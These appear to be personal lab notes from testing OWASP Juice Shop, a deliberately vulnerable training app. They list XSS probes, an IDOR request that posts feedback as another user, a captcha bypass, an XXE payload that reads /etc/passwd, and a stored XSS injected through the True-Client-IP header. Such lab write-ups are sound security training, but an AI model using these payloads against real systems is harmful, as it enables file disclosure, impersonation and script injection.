# Customer Support

After successfully placing an order, click on the "Track Orders" option.

![Pasted image 20250506142359](attachments/Pasted%20image%2020250506142359.png)

#### Testing Reflected `id` Parameter

- Attempted injections like:
    
    ```html
    <script>alert(1)</script>
    <script>alert(1)<%2Fscript>
    <script>alert(1)<%252Fscript>
    <img src=x onerror=alert(1)>
    ```
    
    All inputs were filtered and did not trigger any XSS vulnerability.
    
![Pasted image 20250506143242](attachments/Pasted%20image%2020250506143242.png)

---
#### Customer Feedback Abuse

- Using ZAP, you can manipulate the `rating` JSON parameter by setting it to `0` or even a negative value, even though the UI doesn’t allow it.
    
- **Captcha Bypass:**  
    The captcha did not prevent submitting multiple requests; its restriction is purely UI-based.
    
#### IDOR (Insecure Direct Object References)

- You can post a comment on behalf of another user by changing the `UserId` in the request:
    
    ```json
    {  
      "UserId" : 2,  
      "captchaId" : 6,  
      "captcha" : "19",  
      "comment" : "test comment",  
      "rating" : "-1"  
    }
    ```
    
![Pasted image 20250506171518](attachments/Pasted%20image%2020250506171518.png) 

---
#### Complaint Form

- Upon inspecting the "Choose file" button, it revealed the accepted file types as ‘custom file,’ indicating restricted uploads.
    
    - In the browser’s inspect tool, you will see this in the html code 
		```html
		aria-label="Input area for uploading a single invoice PDF or XML B2B order file or a ZIP archive containing multiple invoices or orders<!---->"
		``` 
	
	- Search with `upload` in the `main.js` file and you will find that it mentioned that XML files were supported:
    
	    ```js
	    uploader = new Tt.l0({
	        allowedMimeType: ["application/pdf", "application/xml", "text/xml", "application/zip", "application/x-zip-compressed", "multipart/x-zip", "application/yaml", "application/x-yaml", "text/yaml", "text/x-yaml"]
	    });
	    ```
    
- **XXE Attack:**  
    An XML External Entity (XXE) payload worked:
    
    ```xml
    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
    ```

    The response printed the contents of `/etc/passwd`.
    
![Pasted image 20250506172845](attachments/Pasted%20image%2020250506172845.png)

---
#### Manipulating the Last Login IP

- You can try manipulating the `X-Forwarded-For` header to alter the last login IP, but the server didn’t respond as expected.
    
    However, if you have access to the server code, you can inspect `/rest/saveLoginIp` requests and see that a custom header, `True-Client-IP`, is used to set the IP.
	    
    - By injecting an XSS payload via this header, like `<img src=x onerror=alert("xss")/>`, you can trigger a stored XSS attack. Upon relogging in and visiting the last login IP page, the alert will be triggered.
	    - Example Payload: `True-Client-IP: <img src=x onerror=alert("xss")/>`
	    - Note: you will need to set a breakpoint on zap to that endpoint `/rest/saveLoginIp` to set this poisoned header manually when you press the logout button from the browser, send that request, login again, visit the last IP page, and it will be alerted, So, this is a stored xss via header poisoning
    
> For our case with Juice shop, you could find the source code repo from the main menu and it is available at [juice-shop/juice-shop: OWASP Juice Shop: Probably the most modern and sophisticated insecure web application](https://github.com/juice-shop/juice-shop)